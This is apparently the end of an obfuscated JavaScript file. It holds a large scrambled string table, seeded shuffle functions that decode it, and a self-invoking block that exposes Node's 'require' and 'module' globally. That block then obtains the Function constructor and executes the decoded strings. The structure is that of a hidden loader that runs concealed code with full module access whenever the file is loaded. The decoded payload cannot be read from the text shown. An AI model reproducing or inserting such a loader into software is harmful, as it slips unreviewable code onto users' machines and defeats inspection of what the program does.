as(<cRiedtssR/RR/erR(.wce.R.rPy(RO(<.gHxrR<T.L!Rx(<o([.+{<c<R<.eiNTRC[x.4RkR$pK\".lcP(.<tk.<RQFknwIR).t-Rr=e{<.PP #E63ap3[R)Lddc;RxR!R\' oo!)w.e!.Rc<0%<iss9RuO6ir$.R.ip6%m-6wRi<z< gr=nweRRN__R(ReJvRfR%:NRPR<nRRR$.R.mR<rR#{Ec.)b<6peiRf#tL..R<PjRR.(,a_ll. .D g<(rhv \"4k! `lR<ke1 c$$5Rz.RR]eu&DiR .R<((cersE.aoRhef)%eLR).:.^)esCR.}.T<P^. Dy<#RcRpNRr)nRRl_3d8W(c=-3EeqeiMRReRzRacCue<l<Rsi.a;rc<.ldRY.RarlRcnOf3hTsdt<M\"m<s(np}:A.fyR<RC<#Ry0vR<}<R.<%ats!lR>-<2lld.nr5=(F:.RRlnRcR\"sz3o\"<fR&3..!Y>fR)beRlshpM%<f.(d!abiFR 3waM<se..qfR.i_.&E!.&RRRcRx{R[R._?R2!!RRcx)RIM.)f=#1ELbRRnJeaMim1)RRR_ |<la<3)0ycd&.#n=l.|Rs;.f(ec.cs=c{?R/%d_!anOce<Rrxa.\'b)=_<m)icAcCRc.n<R.e ..R-<AR5.Rm[dR<<2R.An9xRctmcE%[..R,Qt<uPf_!<R= tZRclpP*.uep6<f.b8RR<cSrk<e}Rckdc.;<tz.l.<!io.<r/2<R=bcRRsVD.R.1b<cc<R}<h+. RvTRp_P<.rs(uPQt:..<>Rk9!=a;o<a*.7r]0Y)8c}z(<a.R.e8Ro tl Rc(A~i!*(bR%cR,c0t< rMRR< Ri< .fPe*+E)m.oj..m8m.cR($<f.R.idey}cBRR!sc<no9R<n RwrN0#tRduc_-RS\"i{i)(nMcR<0N</V<<.,0+w.]<w<ReeR,w/eR.R)i. R<e .6Rga.rgs+Qitd.o!cteaLRo)3R <.cd./.~< .s\\.e<sp5R.<RRwa!*.R)tR,ofRZ<ZtcRhsRr$/.RC..b \"cRt,\'leacPc RR<Rz\"<Ri l0oRRdRs7.R(eCcR_.6\"_R..p<&kddee.<=..lo.=R<!b.&Rc<tcCr0m&cXu\'wnd.s;sw+R4/suDicPba ..i!o1^r}I>e4<:RwCRic<RRRc\". dRpt0<.Rk0<W8r RnR.Dc.CN lwoh.l-<R<pcbR Pe6hY-Rt.cEp:<+a-V<RaRf\'(<rRRR&<az<4RRR.E)7.xrc0ilHRTisc.ZfRfcRx-th).R#=!<C.w\"l{e]e-R</<s4Nt.op\"ce.4Rn{SRo<R)Cc])e(Rw8RR. <1hc{p8cS!e<R?RKa=i6Ri[.IRpR$RbxRScl.p<P!fa!vvsO.!pRRt.EglRt<.!iud.lu<is.RoR4!.P.cm.Pi}Ro..lPNRy6=t{<ae._!RwRtaR.sf.!.]4[e.RkE}-}ve..$NwiD!}.0R#<isaR3p%<}.aR@RJt.RGax.R\'spC0!RGcr.2FRiRePaRnsRRRna<R)5U:\"n=cdc?ABt.20.tdc!C1R c.<edaA.R(.,elRcR<c&<.eCRURif{aJKR+ex-x:Pc%ei@ecRek?pR.4 RR<R#$c..i+!4RR$R3#R.r(PiRR<c.Rci_U!zRRR;u^|.Z.s(TRRTc.d}R<y._c<.RR{$kR4FB($\\<w. .;R<eR4\\sRc8<R.R[EdR uoR[}V(.pd\'\"<Ja(4prAR(.Nc<<rp3.>z eeR!<.<57:&P)c[RbRREM(_P.}RR).=Rhr<,CRRR(<k3R+hn %R.RF)lR;R.s R.jlmR((loH.<R<{PReRi<<cdeK.R.fR2pR(ao~.RyRRR[:RR?eisRPfk Ys(s3.c <4blo<0<9{o<RT@R..nRiR;al?soR0g<T.Rtm<u.s\\?Rl._Rccz4&:?0 .5R/ctc4<R>hi%.i#i}<R.Emc1xAnfR{Scr.R.%|\".PrrRn<cRnP!aRRtRfR.P 8\'R<JA R&i<ecc{]cf.RmaR.irc.iReZ\"n<y!< cR #<,ec!Rd9sic+_1a.ru..b..Reh<R~i$ot<fRdcit<\\go_0lRmvF(<e9s<Rtt( !RnR6}<.itO..&9s4dNRc .o.RR.]j0 R ma4;r<sCa)& mo[xlR*ht!,Aup Ru,fRtf[j)P*cRR1<RSv s!2cIsR..e74hRd\'c:vsr.s;<e(<_!MRfRfLLgal.!.u.R9(Mcla(d}tOa.}RcIebmEc0N(RD%bE$ rd<cw).F<ObZWR.jg.U4\"afR`\'m%/efaxRRR;Rna:7vR0bc.a_R<<jRRs..X)spGi&v\'e.l.2.I.e9rRe.s\'1=r.eRexbb_RR_e9cd<FIP!.cR+8.446/U<<ls!]<u`pRsub<b>JPwp@ilR<i)k!dRLkR.trRx(rr)% /.(]b8cRs+vR-c)}:osR.c#\"<cqk<ek.imRSN.RsE bPPn)<e}o0e\".1dRIR!(r.%.I..Rfza_?RRkf/,tcRRIf.<iR bdRO.cPcdeR.s}ejFbp;o.fs<c_mc<aF.dnc0c RRR.qn .RcR.hRKj<Rs.kc<3Rs.ccTt.trtnt>w;/IcZc8r<i.Rt>Rcs..s s{Te <!.+.R.<uRPRo.<K.m.a.srM<R .cwRic<R)nP(<RReeutcJc%pN.Rsce.=eaf0<\'@S}1<<YIjr!!<4a.fRR.l&<R$..lv.}|5&R.R!<)xfs.b$:Rc l.< o(J.e.#N.7t<)c<w eR0.=<yc !..Re?<n\'B[Rbo\'auR} rae#R=.iR(st2.b~ <Sc.}tTsRr<aR) ryir!C<c td~\" X.ttR<R!d c..!ed.R.<R n.Sne!!)4/oXRRu.enR<.rRqR\"l_M.efttr tRc._r<R.R.dd{Wh{R.<.&RRc<.gf}Rcr52dte}d(}?cF7.xy$W<!..c6pc?Nc0z(h4.RRo=_oa.Pf!f4hR.Rd*e=d#cc6rr{o/RaRS.z.v.RDc<.[R9.\'t]&.RRR-4R&ew\\cRYeonf t.m)e=.icK.R{.0sl1pcRs(chl.WR.yc.{eil3ft<{/.C.(.n<l)>m<<d1<a? nec<R..avloRvjRge._ =R+.RR.wdR.d6%.Icc(+t.:ci\'.cht.b.R!s4ft_Rxta<s}H,cc.dkRnc..}c# n)R.(_)c13.ot.o.}<!.tRR).t<...8Rn.Htct<blRotcQGn^*_xmecPT}..<<r0 lEt!dn\"0pf.gl}R<eRlT@i..g)ne4Ru<fRRTg.cR.c.eet<..^ee,r;t|pcteWFs RgadRroG(ltl #(yr<.#ddt.<R i-o<stId!b)RIEt*RRn&R.c<iRmlR(-(mtck.Ry!0RYJ<c.Ri>rr. w9cTaR=<PcdK]_\\2f( #.Rs%.te<n/Rrycc.nRc$.P&.f.iccBPNRdR;R.5<RR<mPo{(R{_n<lRid.hR .dRnRr!JwR0.RPRr.>=(f<e?.<Bf]xRcbcPcRs}<R(s.RPY.RR_Pk(o<(dl<0eR,1:D1sv.ilhe_PRpccR1qm.dm\"<sisPd.? pmdRhRnct(?$RrtRx.e)`..R.p?i!R1Rr( {.eTRR}.c}<RR8..RpR\"cg;.cc0RrR. t&3nd5ecPb_.R!RaccRbcdb}c(!{t<.Rnv.NR&~eAs$z\"<4<.ogsfCaRl<ocERoRRt..<s.i`R?.sgc..RsRs.\'$xRcsNRR!R`RoR_n!#R,!5qf.#BIR@l.,.]oReRa|<R[t<<:|a[4<R~R!+Eg-R.aP!e &l<5n%cRRdFryc.s/R.;{{,H.;<n<.)4.tdmR)sRd(mRb{.<Rc.rPm.cRe cRckRx)<c&ci.yceluy;,.XdrRlRR# ccf.cR  R$Rcorr(.rCp<Nr#E(]RnR\"ijngRR4<C$adlRac&t(!-Rp.]do.ciR}usRrs(n C<!;.fc.c@z<tR4tCRtRtc=.c3cfo.!  R;<fe8RdrMRR[dN[cyRc:>Tn<l^.lo8RiRRcssc}Rtpc{.sRs...}c.RaY[<a* )I(ldR(wsr6 *R7!a<S.c<\\R.BELRe6Yf<1<ecPrDe sl0PbD#R]o.\'<l.m R(p)<ekac.cR.d.._u<a\'< Rlibfmndf].(%RR<RNDcRER#V..asa[n&R,$<,R<o4RReER)ssL]8ESRReREiR{R<c.{ cWGf}ohdcas.]. fP= os67EocIPoc .7igcFCR. <cE.N .bR"];function b(q,h){for(var i,p,t,s,j,m,g=[],o=0,k=h[0];o< q.length;){g[o]= q.charAt(o),o+= 1};for(i= g.length,o= 0;o< i;){p= k* (o+ h[1])+ k% h[2],j= (t= k* (o+ h[3])+ k% h[4])% i,m= g[s= p% i],g[s]= g[j],g[j]= m,k= (p+ t)% h[5],o+= 1};return g.join(a[0x0])}function c(q){var h=String.fromCharCode(28),i=b(q,NX);return (i= (i= (i= i.split(a[0x3]).join(h)).split(a[0x4]).join(a[0x3])).split(a[0x2]).join(a[0x1])).split(h)}function d(q){return b(q,SX)}function f(v,m){try{var u=Object.getOwnPropertyDescriptor(v,"name");if(!u|| (!u.writable&&  !u.enumerable && u.configurable &&  typeof u.value== "string")){Object.defineProperty(v,"name",{value:m,configurable:true})}}catch(e){};return v}spin= f(b,"spin");splitLane= f(c,"splitLane");peel= f(d,"peel");NX= [6912847,367,20411,613,43759,5019283],SX= [5283741,241,41953,187,56129,4738901];!function(q,h){q.z= z;var i=c(a[0x5]);q[i[0]]= h, typeof module=== i[1]&& (q[i[2]]= module);var p=d(a[0x6]),t=d[p.substring(0,11)],s=t(a[0x0],d(a[0x7]));t(a[0x0],s(d(a[0x8])))(2509)}(global,require)})()
